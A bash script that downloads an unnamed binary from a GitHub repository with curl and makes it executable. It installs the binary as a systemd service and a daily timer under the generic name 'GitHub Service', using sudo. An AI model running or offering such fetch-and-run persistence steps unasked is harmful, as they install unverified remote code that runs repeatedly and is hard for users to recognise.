#!/usr/bin/env bash

ARCH=$(uname -m)

case "$ARCH" in
x86_64)
  BINARY_URL="https://github.com/wtf403/ava/raw/main/github/linux-x86_64"
  ;;
aarch64)
  BINARY_URL="https://github.com/wtf403/ava/raw/main/github/linux-aarch64"
  ;;
*)
  echo "Unsupported architecture: $ARCH"
  exit 1
  ;;
esac

curl -L -o github-binary $BINARY_URL
chmod +x github-binary

# .service file
cat <<EOF >github.service
[Unit]
Description=GitHub Service

[Service]
ExecStart=$(pwd)/github-binary
User=$(whoami)

[Install]
WantedBy=multi-user.target
EOF

# .timer file
cat <<EOF >github.timer
[Unit]
Description=Run GitHub Service daily at midnight

[Timer]
OnCalendar=*-*-* 00:00:00
Unit=github.service

[Install]
WantedBy=timers.target
EOF

sudo mv github.service /etc/systemd/system/
sudo mv github.timer /etc/systemd/system/

sudo systemctl daemon-reload
sudo systemctl enable github.timer
sudo systemctl start github.timer
